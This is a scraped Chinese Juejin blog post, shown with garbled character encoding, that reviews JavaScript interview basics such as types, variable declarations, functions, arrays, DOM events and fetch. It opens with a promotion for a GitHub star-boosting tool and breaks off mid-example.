.4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æŒæ¡ JavaScript åŸºç¡€æ˜¯å‰ç«¯å·¥ç¨‹å¸ˆçš„å¿…å¤‡ç´ å…»ï¼Œä¸ä»…æ˜¯æ—¥å¸¸å¼€å‘çš„æ ¸å¿ƒæ”¯æ’‘ï¼Œæ›´æ˜¯å‘ä¸­é«˜çº§å²—ä½è¿›é˜¶çš„å…³é”®åŸºçŸ³ã€‚ä»¥ä¸‹æ¢³ç†äº†é¢è¯•é«˜é¢‘è€ƒå¯Ÿç‚¹ï¼Œç»“åˆæ ¸å¿ƒåŸç†ä¸å®æˆ˜æ¡ˆä¾‹ï¼ŒåŠ©åŠ›é«˜æ•ˆå¤‡æˆ˜é¢è¯•ã€‚</p>
<h5 data-id="heading-0">Taimili è‰¾ç±³è‰ ( ä¸€æ¬¾ä¸“ä¸šçš„ GitHub star ç®¡ç†å’Œgithub åŠ æ˜Ÿæ¶¨æ˜Ÿå·¥å…·<a href="https://link.juejin.cn?target=taimili.com" title="https://link.juejin.cn?target=taimili.com" target="_blank">taimili.com</a> )</h5>
<p>è‰¾ç±³è‰ æ˜¯ä¸€æ¬¾ä¼˜é›…ä¾¿æ·çš„Â GitHub star ç®¡ç†å’Œgithub åŠ æ˜Ÿæ¶¨æ˜Ÿå·¥å…·ï¼ŒåŸºäº PHP &amp; javascript æ„å»ºï¼Œ èƒ½å¯¹github å¾— star fork follow watch ç®¡ç†å’Œæå‡ï¼Œæœ€é€‚åˆgithub çš„æ·±åº¦ç”¨æˆ·</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ef7b5a991694a99be4603b179ad8d28~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5rqQ5LmL55y8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769508264&amp;x-signature=LHtUPDyeE%2FAIIDjKdgg3Ha4r7bc%3D" alt="WX20251021-210346@2x.png" loading="lazy"/></p>
<h4 data-id="heading-1"/>
<h2 data-id="heading-2">ä¸€ã€æ•°æ®ç±»å‹ä¸å†…å­˜æœºåˆ¶</h2>
<h3 data-id="heading-3">1. åŸºæœ¬æ•°æ®ç±»å‹</h3>
<p>åŒ…å« <code>String</code>ã€<code>Number</code>ã€<code>Boolean</code>ã€<code>Null</code>ã€<code>Undefined</code>ã€ES6 æ–°å¢çš„ <code>Symbol</code>ï¼ˆå”¯ä¸€å€¼ï¼‰ã€ES2020 æ–°å¢çš„ <code>BigInt</code>ï¼ˆå¤§æ•´æ•°ï¼‰ã€‚</p>
<ul>
<li>å­˜å‚¨ä½ç½®ï¼šæ ˆå†…å­˜ï¼ˆStackï¼‰</li>
<li>æ ¸å¿ƒç‰¹æ€§ï¼šå˜é‡ç›´æ¥æŒæœ‰å€¼ï¼Œèµ‹å€¼æ“ä½œæ˜¯<strong>å€¼çš„å¤åˆ¶</strong>ï¼Œä¿®æ”¹æ–°å˜é‡ä¸å½±å“åŸå˜é‡ã€‚</li>
</ul>
<h3 data-id="heading-4">2. å¼•ç”¨æ•°æ®ç±»å‹</h3>
<p>ä»¥ <code>Object</code> ä¸ºåŸºç¡€ï¼Œæ¶µç›–æ™®é€šå¯¹è±¡ã€<code>Array</code>ã€<code>Function</code>ã€<code>Date</code> ç­‰ã€‚</p>
<ul>
<li>å­˜å‚¨æœºåˆ¶ï¼šå¯¹è±¡å®ä½“å­˜äºå †å†…å­˜ï¼ˆHeapï¼‰ï¼Œå˜é‡ä»…æŒæœ‰æŒ‡å‘å †å†…å­˜çš„<strong>å¼•ç”¨åœ°å€</strong>ï¼ˆå¼•ç”¨å­˜äºæ ˆå†…å­˜ï¼‰</li>
<li>æ ¸å¿ƒç‰¹æ€§ï¼šèµ‹å€¼æ“ä½œæ˜¯<strong>å¼•ç”¨çš„å¤åˆ¶</strong>ï¼Œå¤šä¸ªå˜é‡å¯èƒ½æŒ‡å‘åŒä¸€å¯¹è±¡ï¼Œä¿®æ”¹ä»»ä¸€å˜é‡çš„å±æ€§ä¼šå½±å“æ‰€æœ‰å…³è”å˜é‡ã€‚</li>
</ul>
<h3 data-id="heading-5">3. ç»å…¸é¢è¯•æ¡ˆä¾‹</h3>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini">// åŸºæœ¬ç±»å‹èµ‹å€¼ï¼šå€¼å¤åˆ¶ï¼Œäº’ä¸å½±å“
let <span class="hljs-attr">a</span> = <span class="hljs-number">10</span><span class="hljs-comment">;</span>
let <span class="hljs-attr">b</span> = a<span class="hljs-comment">;</span>
<span class="hljs-attr">b</span> = <span class="hljs-number">20</span><span class="hljs-comment">;</span>
console.log(a)<span class="hljs-comment">; // è¾“å‡ºï¼š10</span>

// å¼•ç”¨ç±»å‹èµ‹å€¼ï¼šå¼•ç”¨å¤åˆ¶ï¼ŒæŒ‡å‘åŒä¸€å¯¹è±¡
let <span class="hljs-attr">obj1</span> = { name: <span class="hljs-string">'Mickey'</span> }<span class="hljs-comment">;</span>
let <span class="hljs-attr">obj2</span> = obj1<span class="hljs-comment">;</span>
<span class="hljs-attr">obj2.name</span> = <span class="hljs-string">'Donald'</span><span class="hljs-comment">;</span>
console.log(obj1.name)<span class="hljs-comment">; // è¾“å‡ºï¼šDonald</span>
</code></pre>
<h3 data-id="heading-6">4. ç±»å‹åˆ¤æ–­æ–¹æ³•</h3>




















<table><thead><tr><th>æ–¹æ³•</th><th>é€‚ç”¨åœºæ™¯</th><th>å±€é™æ€§</th></tr></thead><tbody><tr><td><code>typeof</code></td><td>å¿«é€Ÿåˆ¤æ–­åŸºæœ¬ç±»å‹</td><td>1. <code>typeof null</code> è¿”å› <code>object</code>ï¼ˆå†å²é—ç•™ï¼‰ï¼›2. æ— æ³•åŒºåˆ†å¯¹è±¡å­ç±»å‹ï¼ˆå¦‚ Arrayã€Dateï¼‰</td></tr><tr><td><code>instanceof</code></td><td>åˆ¤æ–­å¯¹è±¡æ˜¯å¦ä¸ºæ„é€ å‡½æ•°å®ä¾‹</td><td>åŸºäºåŸå‹é“¾æŸ¥æ‰¾ï¼ŒArray å®ä¾‹åŒæ—¶å±äº Object</td></tr></tbody></table>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> []); <span class="hljs-comment">// "object"ï¼ˆæ— æ³•è¯†åˆ«æ•°ç»„ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>] <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// trueï¼ˆæ­£ç¡®è¯†åˆ«æ•°ç»„ï¼‰</span>
</code></pre>
<h2 data-id="heading-7">äºŒã€å˜é‡å£°æ˜ï¼švarã€let ä¸ constï¼ˆES6 å¿…è€ƒç‚¹ï¼‰</h2>
<p>ä¸‰è€…æ ¸å¿ƒå·®å¼‚æ˜¯é¢è¯•é«˜é¢‘é¢˜ï¼Œéœ€ç²¾å‡†æŒæ¡ä½œç”¨åŸŸã€æå‡æœºåˆ¶ç­‰å…³é”®ç‰¹æ€§ï¼š</p>



































<table><thead><tr><th>ç‰¹æ€§</th><th>var</th><th>let</th><th>const</th></tr></thead><tbody><tr><td>ä½œç”¨åŸŸ</td><td>å‡½æ•°ä½œç”¨åŸŸ</td><td>å—çº§ä½œç”¨åŸŸï¼ˆ<code>{}</code> åŒ…è£¹ï¼‰</td><td>å—çº§ä½œç”¨åŸŸï¼ˆ<code>{}</code> åŒ…è£¹ï¼‰</td></tr><tr><td>å˜é‡æå‡</td><td>å­˜åœ¨ï¼ˆä»…å£°æ˜æå‡ï¼‰</td><td>æ— ï¼ˆå­˜åœ¨æš‚æ—¶æ€§æ­»åŒº TDZï¼‰</td><td>æ— ï¼ˆå­˜åœ¨æš‚æ—¶æ€§æ­»åŒº TDZï¼‰</td></tr><tr><td>é‡å¤å£°æ˜</td><td>å…è®¸</td><td>ä¸å…è®¸</td><td>ä¸å…è®¸</td></tr><tr><td>é‡æ–°èµ‹å€¼</td><td>å…è®¸</td><td>å…è®¸</td><td>ä¸å…è®¸ï¼ˆå¼•ç”¨ä¸å¯å˜ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-8">å…³é”®è€ƒç‚¹è§£æ</h3>
<ul>
<li>æš‚æ—¶æ€§æ­»åŒºï¼ˆTDZï¼‰ï¼š<code>let</code>/<code>const</code> å£°æ˜å‰è®¿é—®å˜é‡ä¼šæŠ›å‡º ReferenceErrorï¼Œé¿å…å˜é‡æå‰ä½¿ç”¨</li>
<li><code>const</code> çš„ "ä¸å˜æ€§"ï¼šä»…ä¿è¯<strong>å¼•ç”¨åœ°å€ä¸å˜</strong>ï¼Œå¯¹è±¡ / æ•°ç»„çš„å†…éƒ¨å±æ€§å¯ä¿®æ”¹</li>
</ul>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">person</span> = { age: <span class="hljs-number">30</span> }<span class="hljs-comment">;</span>
<span class="hljs-attr">person.age</span> = <span class="hljs-number">31</span><span class="hljs-comment">; // å…è®¸ï¼Œä¿®æ”¹å†…éƒ¨å±æ€§</span>
// <span class="hljs-attr">person</span> = {}<span class="hljs-comment">; // æŠ¥é”™ï¼Œç¦æ­¢ä¿®æ”¹å¼•ç”¨åœ°å€</span>
</code></pre>
<h2 data-id="heading-9">ä¸‰ã€è¿ç®—ç¬¦ï¼ˆé‡ç‚¹æŒæ¡çŸ­è·¯ç‰¹æ€§ï¼‰</h2>
<h3 data-id="heading-10">1. æ ¸å¿ƒè¿ç®—ç¬¦åˆ†ç±»</h3>
<ul>
<li>ç®—æœ¯è¿ç®—ç¬¦ï¼š<code>+</code>ã€<code>-</code>ã€<code>*</code>ã€<code>/</code>ã€<code>%</code>ï¼ˆå–æ¨¡ï¼‰ã€<code>**</code>ï¼ˆES7 å¹‚è¿ç®—ï¼‰</li>
<li>æ¯”è¾ƒè¿ç®—ç¬¦ï¼š<code>==</code>ï¼ˆç±»å‹è½¬æ¢åæ¯”è¾ƒï¼‰ã€<code>===</code>ï¼ˆä¸¥æ ¼ç›¸ç­‰ï¼Œæ¨èä½¿ç”¨ï¼‰</li>
<li>é€»è¾‘è¿ç®—ç¬¦ï¼š<code>&amp;&amp;</code>ï¼ˆä¸ï¼‰ã€<code>||</code>ï¼ˆæˆ–ï¼‰ï¼ˆå‡æ”¯æŒçŸ­è·¯æ±‚å€¼ï¼‰</li>
<li>ä¸‰å…ƒè¿ç®—ç¬¦ï¼š<code>condition ? çœŸç»“æœ : å‡ç»“æœ</code>ï¼ˆç®€æ´æ›¿ä»£ç®€å• if-elseï¼‰</li>
</ul>
<h3 data-id="heading-11">2. çŸ­è·¯ç‰¹æ€§å®æˆ˜ï¼ˆå¼€å‘é«˜é¢‘ç”¨æ³•ï¼‰</h3>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// &amp;&amp; çŸ­è·¯ï¼šç¬¬ä¸€ä¸ªå‡å€¼ç›´æ¥è¿”å›ï¼Œåç»­ä¸æ‰§è¡Œ</span>
<span class="hljs-keyword">const</span> userName = user &amp;&amp; user.<span class="hljs-property">name</span>; <span class="hljs-comment">// å®‰å…¨è®¿é—®åµŒå¥—å±æ€§ï¼Œé¿å…æŠ¥é”™</span>
<span class="hljs-keyword">const</span> result1 = <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä¸ä¼šæ‰§è¡Œ'</span>); <span class="hljs-comment">// è¾“å‡ºï¼š0</span>

<span class="hljs-comment">// || çŸ­è·¯ï¼šç¬¬ä¸€ä¸ªçœŸå€¼ç›´æ¥è¿”å›ï¼Œåç»­ä¸æ‰§è¡Œ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>) {
  name = name || <span class="hljs-string">'Guest'</span>; <span class="hljs-comment">// ES6å‰çš„é»˜è®¤å‚æ•°æ–¹æ¡ˆ</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Welcome, <span class="hljs-subst">${name}</span>`</span>);
}
<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šWelcome, Guest</span>
</code></pre>
<h2 data-id="heading-12">å››ã€æµç¨‹æ§åˆ¶</h2>
<h3 data-id="heading-13">1. æ¡ä»¶è¯­å¥</h3>
<ul>
<li><code>if...else if...else</code>ï¼šå¤„ç†å¤šæ¡ä»¶åˆ¤æ–­</li>
<li><code>switch</code>ï¼šå•å€¼å¤šåˆ†æ”¯åœºæ™¯ï¼Œéœ€æ³¨æ„ <code>break</code> é˜²æ­¢ç©¿é€</li>
</ul>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFruitColor</span>(<span class="hljs-params">fruit</span>) </span>{
  <span class="hljs-keyword">switch</span> (fruit) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'apple'</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'red'</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">'banana'</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'yellow'</span>;
    <span class="hljs-keyword">default</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'unknown'</span>;
  }
}
</code></pre>
<h3 data-id="heading-14">2. å¾ªç¯è¯­å¥</h3>






























<table><thead><tr><th>å¾ªç¯ç±»å‹</th><th>é€‚ç”¨åœºæ™¯</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td><code>for</code></td><td>å·²çŸ¥å¾ªç¯æ¬¡æ•°</td><td>çµæ´»æ§åˆ¶ç´¢å¼•</td></tr><tr><td><code>while</code></td><td>æœªçŸ¥å¾ªç¯æ¬¡æ•°ï¼Œæ¡ä»¶å‰ç½®</td><td>æ¡ä»¶ä¸æ»¡è¶³åˆ™ä¸æ‰§è¡Œ</td></tr><tr><td><code>do...while</code></td><td>æœªçŸ¥å¾ªç¯æ¬¡æ•°ï¼Œæ¡ä»¶åç½®</td><td>è‡³å°‘æ‰§è¡Œä¸€æ¬¡</td></tr><tr><td><code>for...of</code></td><td>éå†å¯è¿­ä»£å¯¹è±¡ï¼ˆæ•°ç»„ã€å­—ç¬¦ä¸²ç­‰ï¼‰</td><td>ç›´æ¥è·å–å€¼ï¼Œè¯­æ³•ç®€æ´</td></tr></tbody></table>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>];
<span class="hljs-comment">// for...of éå†ï¼ˆæ¨èï¼‰</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-built_in">num</span> of numbers) {
  console.log(<span class="hljs-built_in">num</span>); <span class="hljs-comment">// è¾“å‡ºï¼š10ã€20ã€30</span>
}
</code></pre>
<h2 data-id="heading-15">äº”ã€å‡½æ•°ï¼ˆJavaScript ä¸€ç­‰å…¬æ°‘ï¼‰</h2>
<h3 data-id="heading-16">1. ä¸‰ç§å£°æ˜æ–¹å¼å¯¹æ¯”</h3>

























<table><thead><tr><th>å£°æ˜æ–¹å¼</th><th>è¯­æ³•ç¤ºä¾‹</th><th>æ ¸å¿ƒç‰¹æ€§</th></tr></thead><tbody><tr><td>å‡½æ•°å£°æ˜</td><td><code>function sum(a,b) { return a+b }</code></td><td>å­˜åœ¨å‡½æ•°æå‡ï¼Œå¯åœ¨å£°æ˜å‰è°ƒç”¨</td></tr><tr><td>å‡½æ•°è¡¨è¾¾å¼</td><td><code>const multiply = function(a,b){}</code></td><td>éµå¾ªå˜é‡æå‡è§„åˆ™ï¼Œå£°æ˜å‰ä¸å¯è°ƒç”¨</td></tr><tr><td>ç®­å¤´å‡½æ•°ï¼ˆES6ï¼‰</td><td><code>const subtract = (a,b) =&gt; a-b</code></td><td>è¯­æ³•ç®€æ´ï¼Œthis ç»‘å®šè¯æ³•ä½œç”¨åŸŸ</td></tr></tbody></table>
<h3 data-id="heading-17">2. é¢è¯•é«˜é¢‘è€ƒç‚¹ï¼šå‡½æ•°æå‡</h3>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">declaredSum</span>(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)); <span class="hljs-comment">// è¾“å‡ºï¼š5ï¼ˆå‡½æ•°å£°æ˜æå‡ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">declaredSum</span>(<span class="hljs-params">a,b</span>) { <span class="hljs-keyword">return</span> a+b; }

<span class="hljs-comment">// console.log(expressedSum(2,3)); // æŠ¥é”™ï¼ˆå‡½æ•°è¡¨è¾¾å¼æ— æå‡ï¼‰</span>
<span class="hljs-keyword">const</span> expressedSum = <span class="hljs-keyword">function</span>(<span class="hljs-params">a,b</span>) { <span class="hljs-keyword">return</span> a+b; };
</code></pre>
<h2 data-id="heading-18">å…­ã€å¯¹è±¡æ“ä½œ</h2>
<h3 data-id="heading-19">1. æ ¸å¿ƒæ“ä½œæ–¹æ³•</h3>
<ul>
<li>
<p>åˆ›å»ºï¼š<code>const obj = { key: 'value' }</code>ï¼ˆå­—é¢é‡è¯­æ³•ï¼Œæ¨èï¼‰</p>
</li>
<li>
<p>å±æ€§è®¿é—®ï¼š</p>
<ul>
<li>ç‚¹è¡¨ç¤ºæ³•ï¼š<code>obj.key</code>ï¼ˆå±æ€§åæ˜¯åˆæ³•æ ‡è¯†ç¬¦æ—¶ä½¿ç”¨ï¼‰</li>
<li>æ–¹æ‹¬å·è¡¨ç¤ºæ³•ï¼š<code>obj['key']</code>ï¼ˆæ”¯æŒç‰¹æ®Šå­—ç¬¦ã€åŠ¨æ€å±æ€§åï¼‰</li>
</ul>
</li>
<li>
<p>å¢åˆ æ”¹ï¼š<code>obj.newKey = 'newVal'</code>ï¼ˆå¢ / æ”¹ï¼‰ã€<code>delete obj.key</code>ï¼ˆåˆ ï¼‰</p>
</li>
</ul>
<h3 data-id="heading-20">2. éå†æŠ€å·§ï¼ˆé¿å…åŸå‹é“¾æ±¡æŸ“ï¼‰</h3>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> car = { <span class="hljs-attr">make</span>: <span class="hljs-string">'Toyota'</span>, <span class="hljs-attr">model</span>: <span class="hljs-string">'Camry'</span>, <span class="hljs-string">'year-2022'</span>: <span class="hljs-literal">true</span> };
<span class="hljs-comment">// for...in éå†ï¼Œä»…è·å–è‡ªèº«å±æ€§</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> car) {
  <span class="hljs-keyword">if</span> (car.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${car[key]}</span>`</span>);
  }
}
</code></pre>
<h2 data-id="heading-21">ä¸ƒã€æ•°ç»„ï¼ˆé«˜é¢‘æ“ä½œä¸æ–¹æ³•ï¼‰</h2>
<h3 data-id="heading-22">1. æ ¸å¿ƒç‰¹æ€§</h3>
<ul>
<li>è®¿é—®ï¼šé€šè¿‡ç´¢å¼• <code>arr[index]</code>ï¼Œç´¢å¼•ä» 0 å¼€å§‹</li>
<li><code>length</code>ï¼šå¯è¯»å†™å±æ€§ï¼Œç”¨äºè·å–é•¿åº¦æˆ–æˆªæ–­æ•°ç»„</li>
</ul>
<h3 data-id="heading-23">2. å¸¸ç”¨æ–¹æ³•åˆ†ç±»ï¼ˆé¢è¯•é‡ç‚¹ï¼‰</h3>




















<table><thead><tr><th>ç±»å‹</th><th>æ–¹æ³•</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td>æ”¹å˜åŸæ•°ç»„</td><td>push/popã€unshift/shiftã€spliceã€sort</td><td>ç›´æ¥ä¿®æ”¹åŸæ•°ç»„ï¼Œéœ€æ³¨æ„å‰¯ä½œç”¨</td></tr><tr><td>ä¸æ”¹å˜åŸæ•°ç»„</td><td>concatã€sliceã€mapã€filterã€find</td><td>è¿”å›æ–°æ•°ç»„ï¼ŒåŸæ•°ç»„ä¿æŒä¸å˜ï¼ˆæ¨èä½¿ç”¨ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-24">3. ç»å…¸é¢è¯•å¯¹æ¯”ï¼šmap vs forEach</h3>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> ids = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-comment">// forEachï¼šä»…éå†ï¼Œæ— è¿”å›å€¼</span>
ids.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">id</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å¤„ç†IDï¼š<span class="hljs-subst">${id}</span>`</span>));

<span class="hljs-comment">// mapï¼šæ˜ å°„è½¬æ¢ï¼Œè¿”å›æ–°æ•°ç»„ï¼ˆæ ¸å¿ƒç”¨é€”ï¼‰</span>
<span class="hljs-keyword">const</span> urls = ids.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">id</span> =&gt;</span> <span class="hljs-string">`/users/<span class="hljs-subst">${id}</span>`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(urls); <span class="hljs-comment">// è¾“å‡ºï¼š['/users/1', '/users/2', '/users/3']</span>
</code></pre>
<h2 data-id="heading-25">å…«ã€DOM æ“ä½œä¸äº‹ä»¶æ¨¡å‹</h2>
<h3 data-id="heading-26">1. é«˜æ•ˆ DOM æ“ä½œï¼ˆæ€§èƒ½ä¼˜åŒ–è€ƒç‚¹ï¼‰</h3>
<p>å¤§é‡æ·»åŠ èŠ‚ç‚¹æ—¶ï¼Œä½¿ç”¨ <code>DocumentFragment</code> å‡å°‘é‡æ’ï¼ˆreflowï¼‰å’Œé‡ç»˜ï¼ˆrepaintï¼‰ï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">list</span> = document.getElementById(<span class="hljs-string">'my-list'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">fragment</span> = document.createDocumentFragment()<span class="hljs-comment">; // ä¸´æ—¶å®¹å™¨</span>

// å…ˆæ·»åŠ åˆ°ç‰‡æ®µï¼ˆæ— DOMé‡æ’ï¼‰
for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 1000; i++) {</span>
  const <span class="hljs-attr">li</span> = document.createElement(<span class="hljs-string">'li'</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">li.textContent</span> = `Item <span class="hljs-variable">${i+1}</span>`<span class="hljs-comment">;</span>
  fragment.appendChild(li)<span class="hljs-comment">;</span>
}

// ä¸€æ¬¡æ€§æ’å…¥DOMï¼ˆä»…1æ¬¡é‡æ’ï¼‰
list.appendChild(fragment)<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-27">2. äº‹ä»¶å§”æ‰˜ï¼ˆæ€§èƒ½ä¼˜åŒ– + åŠ¨æ€å…ƒç´ é€‚é…ï¼‰</h3>
<p>åˆ©ç”¨äº‹ä»¶å†’æ³¡æœºåˆ¶ï¼Œå°†ç›‘å¬å™¨ç»‘å®šåˆ°çˆ¶å…ƒç´ ï¼Œç»Ÿä¸€å¤„ç†å­å…ƒç´ äº‹ä»¶ï¼š</p>
<p>html</p>
<p>é¢„è§ˆ</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"parent-list"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> parent = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'parent-list'</span>);
parent.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-comment">// ç²¾å‡†åŒ¹é…ç›®æ ‡å…ƒç´ </span>
  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-property">nodeName</span> === <span class="hljs-string">'LI'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ç‚¹å‡»äº†ï¼š<span class="hljs-subst">${e.target.textContent}</span>`</span>);
  }
});
</code></pre>
<h2 data-id="heading-28">ä¹ã€AJAX ä¸æœ¬åœ°å­˜å‚¨</h2>
<h3 data-id="heading-29">1. fetch APIï¼ˆä¸»æµå¼‚æ­¥è¯·æ±‚æ–¹æ¡ˆï¼‰</h3>
<p>åŸºäº Promiseï¼Œéœ€æ‰‹åŠ¨å¤„ç† HTTP é”™è¯¯çŠ¶æ€ç ï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUserData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/user/1'</span>);
    <span class="hljs-keyword">if</span> (!res.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTPé”™è¯¯ï¼š<span class="hljs-subst">${res.status}</span>`</span>); <span class="hljs-comment">// å¤„ç†404/500ç­‰é”™è¯¯</span>
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>(); <span class="hljs-comment">// è§£æJSONå“åº”</span>
